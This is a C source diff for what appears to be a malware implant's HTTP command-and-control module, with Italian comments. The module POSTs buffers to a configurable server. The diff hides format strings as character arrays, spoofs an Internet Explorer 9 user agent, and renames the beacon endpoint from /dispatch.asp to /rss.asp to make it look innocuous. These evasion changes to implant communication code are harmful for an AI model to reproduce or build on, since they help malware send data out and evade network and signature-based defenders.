@@ -70,8 +70,9 @@ BOOL WinHTTPSendData(PBYTE pBuffer, ULONG uBuffLen)
 //	free(pDebugString);
 #endif
 	BOOL ret;
+	WCHAR strContentLength[] = { L'C', L'o', L'n', L't', L'e', L'n', L't', L'-', L'L', L'e', L'n', L'g', L't', L'h', L':', L' ', L'%', L'd', L'\0' };
 	WCHAR pContentLength[1024];
-	swprintf_s(pContentLength, 1024, L"Content-Length: %d", uBuffLen);
+	swprintf_s(pContentLength, 1024, strContentLength, uBuffLen);
 	ret = WinHttpSendRequest(hGlobalInternet, 
 		pContentLength,
 		-1L, 
@@ -105,14 +106,17 @@ BOOL WinHTTPSetup(PBYTE pServerUrl, PBYTE pAddrToConnect, ULONG uBufLen, PULONG 
 	char *wTypes[] = { "*\x00/\x00*\x00", 0x0 };
 	BOOL isProxy = FALSE;
 
+	WCHAR strFormat[] = { L'h', L't', L't', L'p', L':', L'/', L'/', L'%', L'S', L'\0' };
 	swprintf_s(_wHost, L"%S", pServerUrl);
-	swprintf_s(_wHostProto, L"http://%S", pServerUrl);
+	swprintf_s(_wHostProto, strFormat, pServerUrl);
 	ZeroMemory(&pProxyInfo, sizeof(pProxyInfo));
 	ZeroMemory(&pProxyConfig, sizeof(pProxyConfig));
 
 	// Crea una sessione per winhttp.
 	//hSession = WinHttpOpen(L"Mozilla/4.0 (compatible; MSIE 5.01; Windows NT 5.0)", WINHTTP_ACCESS_TYPE_NO_PROXY, 0, WINHTTP_NO_PROXY_BYPASS, 0);
-	hSession = WinHttpOpen(L"Mozilla/5.0 (Windows; U; Windows NT 5.0; en-US; rv:1.7.10) Gecko/20050716", WINHTTP_ACCESS_TYPE_NO_PROXY, 0, WINHTTP_NO_PROXY_BYPASS, 0);
+	//hSession = WinHttpOpen(L"Mozilla/5.0 (Windows; U; Windows NT 5.0; en-US; rv:1.7.10) Gecko/20050716", WINHTTP_ACCESS_TYPE_NO_PROXY, 0, WINHTTP_NO_PROXY_BYPASS, 0);
+	hSession = WinHttpOpen(L"Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)", WINHTTP_ACCESS_TYPE_NO_PROXY, 0, WINHTTP_NO_PROXY_BYPASS, 0);
+
 	
 
 	// Cerca nel registry le configurazioni del proxy
@@ -205,7 +209,7 @@ BOOL WinHTTPSetup(PBYTE pServerUrl, PBYTE pAddrToConnect, ULONG uBufLen, PULONG 
 	if (!(hConnect = WinHttpConnect(hSession, (LPCWSTR)_wHost, INTERNET_DEFAULT_HTTP_PORT, 0)))
 		return FALSE;
 
-	if (!(hGlobalInternet = WinHttpOpenRequest(hConnect, L"POST", L"/dispatch.asp", NULL, WINHTTP_NO_REFERER, (LPCWSTR *) wTypes, 0)))
+	if (!(hGlobalInternet = WinHttpOpenRequest(hConnect, L"POST", L"/rss.asp", NULL, WINHTTP_NO_REFERER, (LPCWSTR *) wTypes, 0)))
 	{
 #ifdef _DEBUG
 		OutputDebugString(L"[!!] WinHttpOpenRequest FAILED\n");
